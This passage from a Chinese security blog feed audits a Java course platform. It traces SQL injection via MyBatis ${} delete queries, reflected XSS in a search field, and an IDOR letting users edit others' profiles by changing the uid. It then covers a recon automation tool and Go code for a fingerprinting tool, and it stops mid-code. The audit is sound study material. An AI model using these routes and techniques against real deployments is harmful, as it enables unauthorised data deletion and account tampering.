courseFavoritesDao.deleteCourseFavoritesById(ids);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">/<br>  删除收藏<br> /<br><span class="hljs-meta">@RequestMapping(&quot;/deleteFaveorite&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">deleteFavorite</span><span class="hljs-params">(HttpServletRequest request)</span>&#123;<br>    Map&lt;String, Object&gt; json=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>    <span class="hljs-keyword">try</span>&#123;<br>        String id=request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);<br>        <span class="hljs-keyword">if</span>(id==<span class="hljs-literal">null</span>||id.trim().equals(<span class="hljs-string">&quot;&quot;</span>))&#123;<br>            json=setJson(<span class="hljs-literal">false</span>, <span class="hljs-string">&quot;id不能为空&quot;</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> json;<br>        &#125;<br>        <span class="hljs-comment">// 这里仅判断是否为空</span><br>        courseFavoritesService.deleteCourseFavoritesById(id);<br>        json=setJson(<span class="hljs-literal">true</span>, <span class="hljs-string">&quot;取消收藏成功&quot;</span>, <span class="hljs-literal">null</span>);<br>    &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        json=setJson(<span class="hljs-literal">false</span>, <span class="hljs-string">&quot;异常&quot;</span>, <span class="hljs-literal">null</span>);<br>        logger.error(<span class="hljs-string">&quot;deleteFavorite()---error&quot;</span>,e);<br>    &#125;<br>    <span class="hljs-keyword">return</span> json;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现并没有做任何的过滤，那么就可能存在 SQL 注入了。</p><p>路由：<code>/webapp/deleteFaveorite</code></p><h5 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 删除文章 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteArticleByIds&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br>    DELETE FROM EDU_ARTICLE WHERE EDU_ARTICLE.ARTICLE_ID IN ($&#123;value&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 删除文章内容 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteArticleContentByArticleIds&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br>    DELETE FROM EDU_ARTICLE_CONTENT WHERE EDU_ARTICLE_CONTENT.ARTICLE_ID IN ($&#123;value&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这两个都是  <code>$&#123;&#125;</code> ，看下是否存在过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteArticleByIds</span><span class="hljs-params">(String[] articleIds)</span> &#123;<br>    <span class="hljs-keyword">if</span> (articleIds != <span class="hljs-literal">null</span> &amp;&amp; articleIds.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ids</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; articleIds.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i &lt; articleIds.length - <span class="hljs-number">1</span>) &#123;<br>                ids += articleIds[i] + <span class="hljs-string">&quot;,&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ids += articleIds[i];<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 这两个都在这里</span><br>        articleDao.deleteArticleByIds(ids);<br>        articleDao.deleteArticleContentByArticleIds(ids);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">/<br>  执行删除文章<br> /<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteArticle</span><span class="hljs-params">(String[] artidArr)</span> &#123;<br>    <span class="hljs-comment">// 删除数据中记录</span><br>    articleService.deleteArticleByIds(artidArr);<br>    EHCacheUtil.remove(CacheConstans.ARTICLE_GOOD_RECOMMEND);<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/delete&quot;)</span><br><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">delete</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        model.setViewName(<span class="hljs-built_in">this</span>.getRequestUri(request));<br>        String[] aridArr = request.getParameterValues(<span class="hljs-string">&quot;articelId&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aridArr != <span class="hljs-literal">null</span> &amp;&amp; aridArr.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">this</span>.deleteArticle(aridArr);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        model.setViewName(<span class="hljs-built_in">this</span>.setExceptionRequest(request, e));<br>        logger.error(<span class="hljs-string">&quot;AdminArticleController.delete()--error&quot;</span>, e);<br>    &#125;<br>    <span class="hljs-keyword">return</span> model;<br>&#125;<br></code></pre></td></tr></table></figure><p>路由： <code>/admin/article/delete</code>：</p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h5 id="删除收藏-1"><a href="#删除收藏-1" class="headerlink" title="删除收藏"></a>删除收藏</h5><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291544535.png" alt="image-20230829154429454"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291548494.png" alt="image-20230829154845380"></p><h5 id="删除文章-1"><a href="#删除文章-1" class="headerlink" title="删除文章"></a>删除文章</h5><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291554674.png" alt="image-20230829155433566"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291556868.png" alt="image-20230829155615750"></p><h3 id="XSS-跨站"><a href="#XSS-跨站" class="headerlink" title="XSS 跨站"></a>XSS 跨站</h3><h4 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>先寻找一下输入被回显的功能点，发现首页的搜索框就是：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291941109.png" alt="image-20230829193745409" style="zoom:67%;" /><p>输入的参数被回显到页面中了：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291941387.png" alt="image-20230829193830677"></p><p>路由是：<code>/front/showcoulist</code></p><p>参数：<code>queryCourse.courseName</code></p><p>接下来就是通过路由找到对应的方法，然后看一下该方法对于我们传入的 <code>queryCourse.courseName</code> 做了哪些操作。（ 这里的 <code>filter</code> 没有 <code>XSS</code> 过滤，不需要管 ）</p><p>是 <code>CourseController.java</code> 中的 <code>showCourseList</code> 方法，具体情况如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">showCourseList</span><span class="hljs-params">(HttpServletRequest request, <span class="hljs-meta">@ModelAttribute(&quot;page&quot;)</span> PageEntity page, <span class="hljs-meta">@ModelAttribute(&quot;queryCourse&quot;)</span> QueryCourse queryCourse)</span> &#123;<br>    <span class="hljs-comment">//</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们传输的的参数 <code>queryCourse.courseName</code> 会被自动映射到 <code>queryCourse</code> 对象的相应参数中。该方法返回一个 <code>ModelAndView</code>，其会由视图层渲染出页面。</p><p>接下来其实就是看  <code>queryCourse</code> 对象中的 <code>courseName</code> 会经历什么？</p><p>先是作为参数传递给 <code>courseService.queryWebCourseListPage</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;CourseDto&gt; courseList = courseService.queryWebCourseListPage(queryCourse, page);<br>model.addObject(<span class="hljs-string">&quot;courseList&quot;</span>, courseList);<br></code></pre></td></tr></table></figure><p>发现它其实就是进行了 SQL 查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;CourseDto&gt; <span class="hljs-title function_">queryWebCourseListPage</span><span class="hljs-params">(QueryCourse queryCourse,PageEntity page)</span>;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308292001848.png" alt="image-20230829200121681"></p><p>这里用到了我们输入的参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">AND</span> EDU_COURSE.COURSE_NAME <span class="hljs-keyword">LIKE</span> CONCAT(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;e.courseName&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)<br></code></pre></td></tr></table></figure><p>没有被修改，转义，之后是 <code>queryCourse.getSubjectId()</code> 但对 <code>courseName</code> 参数没有影响，最后就直接被添加到了模板中了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">model.addObject(<span class="hljs-string">&quot;queryCourse&quot;</span>, queryCourse);<br></code></pre></td></tr></table></figure><p>这说明用户输入的参数没有做任何的过滤，仅仅是作为参数执行了一次 SQL 语句，而且最后还添加到了视图模型了。这就说明了该功能点未对 XSS 做过滤。</p><p>不过实际上看了一下视图层的模板文件，发现 <code>showCourseList</code> 方法对应的模板文件 <code>courses-list.jsp</code>其实并没有将 <code>courseName</code> 输出到页面，这里是安全的。但是 <code>header.jsp</code> 中输出了 <code>queryCourse.courseName</code> 导致的 XSS。应该是这里的布局问题，把  <code>header.jsp</code>  加到了  <code>courses-list.jsp</code> 中导致 XSS 的产生。</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308292032453.png" alt="image-20230829203232416" style="zoom:67%;" /><h4 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;输入你想学的课程&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;queryCourse.courseName&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;参数&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>直接闭合即可：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308292035960.png" alt="image-20230829203544833"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308292036355.png" alt="image-20230829203616219"></p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><h4 id="漏洞发现-2"><a href="#漏洞发现-2" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>寻找功能点，修改个人信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311303292.png" alt="image-20230831130349109"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311305591.png" alt="image-20230831130500435"></p><p>找到对应方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311308963.png" alt="image-20230831130813795"></p><p>继续跟进，发现是直接通过 id 获取用户，然后去修改：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311309898.png" alt="image-20230831130902854"></p><p>该项目也没有 Fliter 或者第三方的身份验证组件，那么直接通过 userId 即可越权修改。</p><h4 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>那么直接替换 uid 修改，登录 uid 为 3 的用户，点击修改抓包：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311317143.png" alt="image-20230831131717994"></p><p>修改 uid 为 7 的用户信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311318054.png" alt="image-20230831131814890"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>auto赏金自动化工具</title>
    <link href="/2023/08/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/auto%E8%B5%8F%E9%87%91%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/08/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/auto%E8%B5%8F%E9%87%91%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="auto赏金自动化工具"><a href="#auto赏金自动化工具" class="headerlink" title="auto赏金自动化工具"></a>auto赏金自动化工具</h1><p>项目地址：<a href="https://github.com/fuyoumingyan/auto">https://github.com/fuyoumingyan/auto</a></p><p>写这款工具的初衷是去完成一个信息收集的自动化操作，因为平常信息收集阶段需要使用多种工具然后组合使用，其中的结果还需要手动处理，比较麻烦，所以是写了这款工具，不过最后写写改改把漏扫描方面的工具也集成了。</p><h2 id="开发思路"><a href="#开发思路" class="headerlink" title="开发思路"></a>开发思路</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/%E8%B5%8F%E9%87%91%E8%87%AA%E5%8A%A8%E5%8C%96.png" alt="赏金自动化"></p><h2 id="待完善"><a href="#待完善" class="headerlink" title="待完善"></a>待完善</h2><ul><li>学习前端部分的知识，做成一个类似 <code>ARL</code> 灯塔的 WEB 项目</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gofinger指纹识别工具</title>
    <link href="/2023/08/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/gofinger%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/08/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/gofinger%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="gofinger指纹识别工具"><a href="#gofinger指纹识别工具" class="headerlink" title="gofinger指纹识别工具"></a>gofinger指纹识别工具</h1><p>项目地址：<a href="https://github.com/fuyoumingyan/gofinger">https://github.com/fuyoumingyan/gofinger</a></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>之前读了 TideFinger 和 Ehole 这两款指纹识别工具，现在来简单总结一下指纹识别的方法：</p><ul><li><code>title、body、header</code> 的内容匹配</li><li><code>ico、js</code> 等特定文件的 hash 匹配</li></ul><p>TideFinger 是比较全面的，先使用匹配 title、body、header ，如果未识别到 CMS 就进行特定文件的 hash 匹配。不过 Python 版本的指纹库也很久没有更新了，出了 Go 版的，不过没有开源。</p><p>Ehole 相比于 TideFinger 增加了一些很棒的功能，如：</p><ul><li>从 FOFA 获取资产并进行指纹识别</li><li>从  JS 中提取 URL 并再次进行指纹识别</li><li>在 Cookie 中添加 rememberMe 字段用于检测 shiro 框架</li></ul><p>不过在指纹库方面有些不足，指纹数量较少，差不多 943 条，中间还有重复的指纹（ 规则不同 ）。</p><p>且指纹匹配条件比较单一，比如 ThinkPHP ，只有这一个规则：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;cms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ThinkPHP&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;header&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keyword&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ThinkPHP&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>总体来说，其实都是指纹库方面有些旧了，工具都很不错。</p><h2 id="指纹来源"><a href="#指纹来源" class="headerlink" title="指纹来源"></a>指纹来源</h2><p>上面的 2 款工具都是指纹库比较老旧了，这里我是去提取了 <code>goby 2.7.1</code> 中的的指纹，软硬件指纹共 7085 条，算是比较全面的了。</p><p>在 web 的指纹规则方面，有 <code>title、body、header、cert</code>，<code>cert</code> 这里规则比较少，也没有实现。不过添加了一个 <code>ico_hash</code> 的指纹匹配。</p><p><code>goby</code> 的指纹规则算是比较全的，比如 <code>ThinkPHP</code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308271334938.png" alt="image-20230827133424780"></p><p><code>ico_hash</code> 是需要后期自己慢慢添加的，<code>goby</code> 的指纹没有，但是可以借助 <code>fofa</code> 来获取 <code>ico_hash</code> ，还是拿 <code>ThinkPHP</code>：</p><p>搜索 <code>app=&quot;ThinkPHP&quot;</code>，下面会出现相关的 ico 信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308271337464.png" alt="image-20230827133726374"></p><p>选择 ico 后，就会获取到 ico_hash 了：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308271338636.png" alt="image-20230827133838602"></p><p>之后可以手动添加一条或规则或者使用提供的 python 脚本，先搜索获取该规则的具体名字，然后添加即可。</p><p>该脚本也可以去添加新的规则，不仅仅是去追加或规则。</p><h2 id="开发思路"><a href="#开发思路" class="headerlink" title="开发思路"></a>开发思路</h2><p>gofinger 整体流程分 2 个步骤：</p><ul><li>请求 URL，获取 <code>title、body、header、ico_hashs</code></li><li>对获取的信息进行指纹匹配</li></ul><p>这里也没有向 <code>TideFinger</code> 那样去获取特定文件的 <code>hash</code> ，所以在指纹识别方面可能没有 <code>TideFinger</code> 那样更详细。</p><p>不过我的主要定位就是批量、快速的指纹识别，暂时也不考虑去获取那些 hash 进行匹配。</p><p>请求客户端设置：</p><ul><li>超时限制</li><li>重定向次数限制</li><li>重定向后 cookie 的 rememberMe 字段</li><li>随机 User-Agent 头</li></ul><p>请求设置：</p><ul><li>body 编码转换为 utf-8</li><li>在响应类型是音频、文件等情况时，不保存其 body ，浪费时间且匹配不到指纹</li><li>获取根目录、HTML 解析的 ico_hashs <ol><li>有的 cms 会把特征 ico 放到根目录直接 url&#x2F;favicon.ico 就可以请求（ ThinkPHP ）</li><li>有的就会去放到其他的路径，需要去解析 HTML 然后获取 ico 路径</li></ol></li></ul><p>所以在请求这里，其实是每个 URL 请求了 3 次，有 2 次是针对 ico 的。</p><p>保存设置：</p><ul><li>支持保存为 csv 文件</li></ul><p>在指纹匹配这里，发现了 fofa 的 rule 太复杂了，好多都是这么长的一串：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">((header=\<span class="hljs-string">&quot;thinkphp<span class="hljs-subst">\&quot;</span> || header=<span class="hljs-subst">\&quot;</span>think_template<span class="hljs-subst">\&quot;</span>) &amp;&amp; header!=<span class="hljs-subst">\&quot;</span>couchdb<span class="hljs-subst">\&quot;</span> &amp;&amp; header!=<span class="hljs-subst">\&quot;</span>St: upnp:rootdevice<span class="hljs-subst">\&quot;</span>) || body=<span class="hljs-subst">\&quot;</span>href=<span class="hljs-subst">\\</span><span class="hljs-subst">\&quot;</span>http://www.thinkphp.cn<span class="hljs-subst">\\</span><span class="hljs-subst">\&quot;</span>&gt;ThinkPHP&lt;/a</span><br><span class="hljs-string">&gt;&lt;sup&gt;<span class="hljs-subst">\&quot;</span> || ((banner=<span class="hljs-subst">\&quot;</span>thinkphp<span class="hljs-subst">\&quot;</span> || banner=<span class="hljs-subst">\&quot;</span>think_template<span class="hljs-subst">\&quot;</span>) &amp;&amp; banner!=<span class="hljs-subst">\&quot;</span>couchdb<span class="hljs-subst">\&quot;</span> &amp;&amp; banner!=<span class="hljs-subst">\&quot;</span>St: upnp:rootdevice<span class="hljs-subst">\&quot;</span>) || icon_hash=<span class="hljs-subst">\&quot;</span>1165838194<span class="hljs-subst">\&quot;</span>&quot;</span>,<br></code></pre></td></tr></table></figure><p>那么使用类似 TideFinger 的 <code>if &#39;||&#39; in key and &#39;&amp;&amp;&#39; not in key and &#39;(&#39; not in key</code> 方法就不行了。</p><p>这里使用的是 <code>w8ay</code> 佬的思路，用 “后缀表达式” 的方法来识别这些运算符：</p><ul><li><a href="https://x.hacking8.com/post-383.html">fofa语法的cms识别脚本.md</a></li></ul><p> 对于上面的一堆规则，我是先通过正则将他们去分割为一个个”单元”，然后去识别对应的”规则单元”，把他们转换为 <code>bool</code> 字符串，之后就获取到了只有 <code>true false &amp;&amp; || ()</code> 的单元切片。然后再将这些单元切片转换为 “后缀表达式”，之后就是去计算这些后缀表示了。</p><p>分割为规则单元：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">splitUnits</span><span class="hljs-params">(expression <span class="hljs-type">string</span>, info *Info)</span></span> []<span class="hljs-type">string</span> &#123;<br>pattern := <span class="hljs-string">`(\w+\s*(!?=)\s*&quot;(?:\\&quot;|[^&quot;])*&quot;\s*)|([&amp;,|]&#123;2&#125;)|[(,)]`</span><br>re := regexp.MustCompile(pattern)<br>matches := re.FindAllString(expression, <span class="hljs-number">-1</span>)<br><span class="hljs-keyword">var</span> units []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, match := <span class="hljs-keyword">range</span> matches &#123;<br>match = unEscapeAndSpace(match)<br><span class="hljs-keyword">if</span> match != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">if</span> match == <span class="hljs-string">&quot;||&quot;</span> || match == <span class="hljs-string">&quot;&amp;&amp;&quot;</span> || match == <span class="hljs-string">&quot;(&quot;</span> || match == <span class="hljs-string">&quot;)&quot;</span> &#123;<br>units = <span class="hljs-built_in">append</span>(units, match)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>units = <span class="hljs-built_in">append</span>(units, strconv.FormatBool(info.matchSingleRule(match)))<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> units<br>&#125;<br></code></pre></td></tr></table></figure><p>转换为后缀表达式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">infixToPostfix</span><span class="hljs-params">(expression <span class="hljs-type">string</span>, info *Info)</span></span> []<span class="hljs-type">string</span> &#123;<br>operatorPrecedence := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;||&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;&amp;&amp;&quot;</span>: <span class="hljs-number">2</span>,<br>&#125;<br>units := splitUnits(expression, info)<br><span class="hljs-keyword">var</span> output []<span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> stack Stack<br><br><span class="hljs-keyword">for</span> _, token := <span class="hljs-keyword">range</span> units &#123;<br><span class="hljs-keyword">if</span> token == <span class="hljs-string">&quot;(&quot;</span> &#123;<br><span class="hljs-comment">// 左括号 =&gt; 入栈</span><br>stack.Push(token)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> token == <span class="hljs-string">&quot;)&quot;</span> &#123;<br><span class="hljs-comment">// 右括号 =&gt; 一直弹出, 直到遇到左括号</span><br><span class="hljs-keyword">for</span> stack.Top() != <span class="hljs-string">&quot;(&quot;</span> &amp;&amp; stack.Top() != <span class="hljs-string">&quot;&quot;</span> &#123;<br>output = <span class="hljs-built_in">append</span>(output, stack.Pop())<br>&#125;<br><span class="hljs-comment">// 弹出左括号</span><br>stack.Pop()<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> operatorPrecedence[token] &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 如果是该符号优先级比栈顶低 =&gt; 弹出</span><br><span class="hljs-keyword">for</span> stack.Top() != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; operatorPrecedence[token] &lt;= operatorPrecedence[stack.Top()] &#123;<br>output = <span class="hljs-built_in">append</span>(output, stack.Pop())<br>&#125;<br><span class="hljs-comment">// 该符号优先级比栈顶高了, 入栈</span><br>stack.Push(token)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 不是符号, 直接入栈</span><br>output = <span class="hljs-built_in">append</span>(output, token)<br>&#125;<br>&#125;<br><span class="hljs-comment">// 遍历万之后, 将栈这符号弹出</span><br><span class="hljs-keyword">for</span> stack.Top() != <span class="hljs-string">&quot;&quot;</span> &#123;<br>output = <span class="hljs-built_in">append</span>(output, 